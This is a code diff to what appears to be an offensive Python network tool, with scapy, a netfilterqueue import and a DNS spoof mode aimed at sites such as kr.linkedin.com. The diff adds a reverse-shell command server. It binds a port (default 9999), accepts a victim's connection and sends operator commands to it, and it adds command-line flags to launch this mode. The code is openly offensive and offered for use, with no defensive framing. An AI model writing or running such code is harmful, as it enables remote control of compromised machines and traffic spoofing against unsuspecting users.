@@ -5,6 +5,54 @@ import scapy.all as scapy
 from scapy.layers import http
 import optparse
 import netfilterqueue
+import socket
+import sys
+
+
+def createSocket():
+    try:
+        global s
+        s = socket.socket()  # Creating a Socket
+    except socket.error as msg:
+        print("Socket Creation Error: " + str(msg))
+
+def bindSocket(host, port):
+    try:
+        global s
+        print("Binding Port: " + str(port))
+        s.bind((host, port)) 
+        s.listen(5) 
+
+    except socket.error as msg:
+        print("Socket Binding Error: " + str(msg) + "\n" + "Retrying...")
+        bindSocket()
+
+def acceptSocket():
+    connection, address = s.accept()
+    print("Connection Established With: IP " + address[0] + ", Port: " + str(address[1]))
+    sendCommand(connection) 
+    connection.close()
+
+def sendCommand(connection):
+    while True:
+        cmd = input()
+        if cmd == "quit":
+            connection.close()
+            s.close()
+            sys.exit()
+
+        if len(str.encode(cmd)) > 0:
+            connection.send(str.encode(cmd))
+            clientResponse = str(connection.recv(1024), "utf-8")
+            print(clientResponse, end="")
+
+def reverse_shell(host = "", port = 9999):
+    createSocket()
+    bindSocket(host, port)
+    acceptSocket()
+
+
+
 
 websites = ["www.google.com", "www.bing.com", "www.facebook.com",
             "wwww.baidu.com", "kr.linkedin.com"]
@@ -158,6 +206,10 @@ def main():
 
     parser.add_argument("--dns_spoof", action="store_true", help="DNS Spoof Mode")
     parser.add_argument("--url", type=str, default="kr.linkedin.com", help="Target Domain Name")
+
+    parser.add_argument("--reverse_shell", action="store_true", help="Reverse Shell Mode")
+    parser.add_argument("--host", type=str, default="", help="host")
+    parser.add_argument("--port", type=int, default=9999, help="port")
     
     args = parser.parse_args()
     if not os.path.exists(args.path):
@@ -178,6 +230,9 @@ def main():
     
     if args.dns_spoof:
         dns_spoof(args.ip)
+
+    if args.reverse_shell:
+        reverse_shell(args.host, args.port)
 
     
     # if not args.download and not args.execute:
